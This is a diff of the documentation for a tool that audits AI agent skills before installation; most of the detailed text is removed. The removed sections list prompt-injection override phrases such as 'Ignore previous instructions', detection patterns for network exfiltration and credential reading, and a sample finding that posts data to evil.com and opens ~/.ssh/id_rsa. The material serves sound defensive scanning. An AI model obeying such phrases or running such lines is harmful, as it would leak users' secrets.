@@ -1,186 +1,80 @@
 ---
-name: "skill-security-auditor"
-description: "Security audit and vulnerability scanner for AI agent skills before installation. Use when: (1) evaluating a skill from an untrusted source, (2) auditing a skill directory or git repo URL for malicious code, (3) pre-install security gate for Claude Code plugins, OpenClaw skills, or Codex skills, (4) scanning Python scripts for dangerous patterns like os.system, eval, subprocess, network exfiltration, (5) detecting prompt injection in SKILL.md files, (6) checking dependency supply chain risks, (7) verifying file system access stays within skill boundaries. Triggers: \"audit this skill\", \"is this skill safe\", \"scan skill for security\", \"check skill before install\", \"skill security check\", \"skill vulnerability scan\"."
-risk: low
-source: community
-date_added: '2026-06-12'
+name: skill-security-auditor
+description: Security audit and vulnerability scanner for AI agent skills before installation. Scans for code injection, credential harvesting, network exfiltration, prompt injection, and supply chain risks. Produces PASS/WARN/FAIL verdict with remediation guidance.
+compatibility: |
+  - Runtime: Python 3.8+
+  - Dependencies: Standard library (no external deps)
+  - Permissions: read:repo, read:security-advisories
 ---
 
 # Skill Security Auditor
 
-Scan and audit AI agent skills for security risks before installation. Produces a
-clear **PASS / WARN / FAIL** verdict with findings and remediation guidance.
+Scan and audit AI agent skills for security risks before installation.
 
-## Quick Start
-
-```bash
-# Audit a local skill directory
-python3 scripts/skill_security_auditor.py /path/to/skill-name/
-
-# Audit a skill from a git repo
-python3 scripts/skill_security_auditor.py https://github.com/user/repo --skill skill-name
-
-# Audit with strict mode (any WARN becomes FAIL)
-python3 scripts/skill_security_auditor.py /path/to/skill-name/ --strict
-
-# Output JSON report
-python3 scripts/skill_security_auditor.py /path/to/skill-name/ --json
-```
-
-## What Gets Scanned
-
-### 1. Code Execution Risks (Python/Bash Scripts)
-
-Scans all `.py`, `.sh`, `.bash`, `.js`, `.ts` files for:
-
-| Category | Patterns Detected | Severity |
-|----------|-------------------|----------|
-| **Command injection** | `os.system()`, `os.popen()`, `subprocess.call(shell=True)`, backtick execution | 🔴 CRITICAL |
-| **Code execution** | `eval()`, `exec()`, `compile()`, `__import__()` | 🔴 CRITICAL |
-| **Obfuscation** | base64-encoded payloads, `codecs.decode`, hex-encoded strings, `chr()` chains | 🔴 CRITICAL |
-| **Network exfiltration** | `requests.post()`, `urllib.request`, `socket.connect()`, `httpx`, `aiohttp` | 🔴 CRITICAL |
-| **Credential harvesting** | reads from `~/.ssh`, `~/.aws`, `~/.config`, env var extraction patterns | 🔴 CRITICAL |
-| **File system abuse** | writes outside skill dir, `/etc/`, `~/.bashrc`, `~/.profile`, symlink creation | 🟡 HIGH |
-| **Privilege escalation** | `sudo`, `chmod 777`, `setuid`, cron manipulation | 🔴 CRITICAL |
-| **Unsafe deserialization** | `pickle.loads()`, `yaml.load()` (without SafeLoader), `marshal.loads()` | 🟡 HIGH |
-| **Subprocess (safe)** | `subprocess.run()` with list args, no shell | ⚪ INFO |
-
-### 2. Prompt Injection in SKILL.md
-
-Scans SKILL.md and all `.md` reference files for:
-
-| Pattern | Example | Severity |
-|---------|---------|----------|
-| **System prompt override** | "Ignore previous instructions", "You are now..." | 🔴 CRITICAL | <!-- noqa: SEC-AUDITOR: self-referential false-positive, this is the auditor's own pattern table -->
-| **Role hijacking** | "Act as root", "Pretend you have no restrictions" | 🔴 CRITICAL | <!-- noqa: SEC-AUDITOR: self-referential false-positive, this is the auditor's own pattern table -->
-| **Safety bypass** | "Skip safety checks", "Disable content filtering" | 🔴 CRITICAL | <!-- noqa: SEC-AUDITOR: self-referential false-positive, this is the auditor's own pattern table -->
-| **Hidden instructions** | Zero-width characters, HTML comments with directives | 🟡 HIGH |
-| **Excessive permissions** | "Run any command", "Full filesystem access" | 🟡 HIGH |
-| **Data extraction** | "Send contents of", "Upload file to", "POST to" | 🔴 CRITICAL | <!-- noqa: SEC-AUDITOR: self-referential false-positive, this is the auditor's own pattern table -->
-
-### 3. Dependency Supply Chain
-
-For skills with `requirements.txt`, `package.json`, or inline `pip install`:
-
-| Check | What It Does | Severity |
-|-------|-------------|----------|
-| **Known vulnerabilities** | Cross-reference with PyPI/npm advisory databases | 🔴 CRITICAL |
-| **Typosquatting** | Flag packages similar to popular ones (e.g., `reqeusts`) | 🟡 HIGH |
-| **Unpinned versions** | Flag `requests>=2.0` vs `requests==2.31.0` | ⚪ INFO |
-| **Install commands in code** | `pip install` or `npm install` inside scripts | 🟡 HIGH |
-| **Suspicious packages** | Low download count, recent creation, single maintainer | ⚪ INFO |
-
-### 4. File System & Structure
-
-| Check | What It Does | Severity |
-|-------|-------------|----------|
-| **Boundary violation** | Scripts referencing paths outside skill directory | 🟡 HIGH |
-| **Hidden files** | `.env`, dotfiles that shouldn't be in a skill | 🟡 HIGH |
-| **Binary files** | Unexpected executables, `.so`, `.dll`, `.exe` | 🔴 CRITICAL |
-| **Large files** | Files >1MB that could hide payloads | ⚪ INFO |
-| **Symlinks** | Symbolic links pointing outside skill directory | 🔴 CRITICAL |
-
-## Audit Workflow
-
-1. **Run the scanner** on the skill directory or repo URL
-2. **Review the report** — findings grouped by severity
-3. **Verdict interpretation:**
-   - **✅ PASS** — No critical or high findings. Safe to install.
-   - **⚠️ WARN** — High/medium findings detected. Review manually before installing.
-   - **❌ FAIL** — Critical findings. Do NOT install without remediation.
-4. **Remediation** — each finding includes specific fix guidance
-
-## Reading the Report
-
-```
-╔══════════════════════════════════════════════╗
-║  SKILL SECURITY AUDIT REPORT                ║
-║  Skill: example-skill                        ║
-║  Verdict: ❌ FAIL                            ║
-╠══════════════════════════════════════════════╣
-║  🔴 CRITICAL: 2  🟡 HIGH: 1  ⚪ INFO: 3    ║
-╚══════════════════════════════════════════════╝
-
-🔴 CRITICAL [CODE-EXEC] scripts/helper.py:42
-   Pattern: eval(user_input)
-   Risk: Arbitrary code execution from untrusted input
-   Fix: Replace eval() with ast.literal_eval() or explicit parsing
-
-🔴 CRITICAL [NET-EXFIL] scripts/analyzer.py:88
-   Pattern: requests.post("https://evil.com/collect", data=results)
-   Risk: Data exfiltration to external server
-   Fix: Remove outbound network calls or verify destination is trusted
-
-🟡 HIGH [FS-BOUNDARY] scripts/scanner.py:15
-   Pattern: open(os.path.expanduser("~/.ssh/id_rsa"))
-   Risk: Reads SSH private key outside skill scope
-   Fix: Remove filesystem access outside skill directory
-
-⚪ INFO [DEPS-UNPIN] requirements.txt:3
-   Pattern: requests>=2.0
-   Risk: Unpinned dependency may introduce vulnerabilities
-   Fix: Pin to specific version: requests==2.31.0
-```
-
-## Advanced Usage
-
-### Audit a Skill from Git Before Cloning
+## Trigger
 
 ```bash
-# Clone to temp dir, audit, then clean up
-python3 scripts/skill_security_auditor.py https://github.com/user/skill-repo --skill my-skill --cleanup
+python src/skill_security_auditor.py /path/to/skill-name
+python src/skill_security_auditor.py /path/to/skill-name --json --strict
 ```
 
-### CI/CD Integration
+## Input Schema
 
-```yaml
-# GitHub Actions step
-- name: "audit-skill-security"
-  run: |
-    python3 skill-security-auditor/scripts/skill_security_auditor.py ./skills/new-skill/ --strict --json > audit.json
-    if [ $? -ne 0 ]; then echo "Security audit failed"; exit 1; fi
+```typescript
+interface SkillInput {
+  skillPath: string;           // Required. Directory or git URL to audit
+  strict?: boolean;            // Optional. Treat WARN as FAIL (default: false)
+  json?: boolean;              // Optional. Output JSON (default: false)
+  cleanup?: boolean;           // Optional. Remove temp clone after audit
+}
 ```
 
-### Batch Audit
+## Output Schema
 
-```bash
-# Audit all skills in a directory
-for skill in skills/*/; do
-  python3 scripts/skill_security_auditor.py "$skill" --json >> audit-results.jsonl
-done
+```typescript
+interface SkillOutput {
+  status: "ok" | "error";
+  verdict: "PASS" | "WARN" | "FAIL";
+  critical_count: number;
+  high_count: number;
+  info_count: number;
+  findings: Array<{
+    severity: "CRITICAL" | "HIGH" | "INFO";
+    code: string;
+    file: string;
+    pattern: string;
+    risk: string;
+    fix: string;
+  }>;
+}
 ```
 
-## Exemption Policy
+## Verdict Categories
 
-A flagged pattern can be silenced with an inline marker:
+- **✅ PASS** — No critical/high findings. Safe to deploy.
+- **⚠️ WARN** — High/medium findings. Review manually before installing.
+- **❌ FAIL** — Critical findings. Do NOT install without remediation.
 
-```
-<code>  # noqa: SEC-AUDITOR: <reason>
-```
+## Scans
 
-(`//` or `<!--…-->` per file's comment syntax.) Two distinct uses — don't conflate them:
+Analyzes Python, Shell, JavaScript, TypeScript, and Markdown files for:
 
-| Class | Example | Who approves |
-|-------|---------|---------------|
-| **Self-referential false-positive** — the auditor's own pattern table contains the strings it's matching against (e.g. `skill_security_auditor.py`'s `CODE_PATTERNS` list) | the `risk`/`fix` text for `eval()` itself contains the word `eval(` | Tier 2 — no safety exception, just a scanner matching its own source |
-| **Genuine exemption** — real executable code that trips a CRITICAL/HIGH pattern but is reviewed safe | `child_process.spawn()` with a validated, non-user-controlled command ([skills/cic-run-gate/src/index.ts:1](../cic-run-gate/src/index.ts#L1), commit `43f4f06`) | **Tier 1** — this is a safety-gate exception per Global Operating Rules §Safety Boundaries ("Exceptions require Tier 1 approval + documented reason") |
+- Command injection (`os.system`, `subprocess` with `shell=True`)
+- Code execution (`eval()`, `exec()`)
+- Network exfiltration (`requests`, `socket`, `fetch`)
+- Credential harvesting (`~/.ssh`, `~/.aws`, env vars)
+- Prompt injection in SKILL.md (system prompt override, role hijacking)
+- File system abuse (writes outside skill dir, symlinks)
+- Dependency supply chain risks (typosquatting, unpinned versions)
 
-Rules:
-- `<reason>` is required, not optional — must state *why* the flagged call is safe (e.g. "gateId validated by pattern, no user-controlled input"), not just restate the pattern name.
-- For genuine exemptions, the reason must also appear in the commit message — the inline comment is the searchable marker, the commit is the audit trail. Neither alone is sufficient.
-- Adding a genuine exemption without Tier 1 sign-off is a governance violation (undocumented safety-gate bypass) — halt and escalate per the drift-response rule, don't self-approve.
-- `grep -rn "noqa: SEC-AUDITOR"` across the repo is the standing way to inventory every live exemption; re-review the genuine-class ones whenever the auditor's `CODE_PATTERNS` list changes.
+---
 
-## Threat Model Reference
+## Full Reference
 
-For the complete threat model, detection patterns, and known attack vectors against AI agent skills, see [references/threat-model.md](references/threat-model.md).
+For scanning details, threat model, audit workflow, advanced usage, and limitations:
 
-## Limitations
+**→ See [Skill Operator Guide](../../docs/meta/skill-operator-guide.md)**
 
-- Cannot detect logic bombs or time-delayed payloads with certainty
-- Obfuscation detection is pattern-based — a sufficiently creative attacker may bypass it
-- Network destination reputation checks require internet access
-- Does not execute code — static analysis only (safe but less complete than dynamic analysis)
-- Dependency vulnerability checks use local pattern matching, not live CVE databases
+For detailed scan categories, report interpretation, exemption policy, and CI/CD integration:
 
-When in doubt after an audit, **don't install**. Ask the skill author for clarification.
+**→ See [docs/USAGE.md](./docs/USAGE.md)**
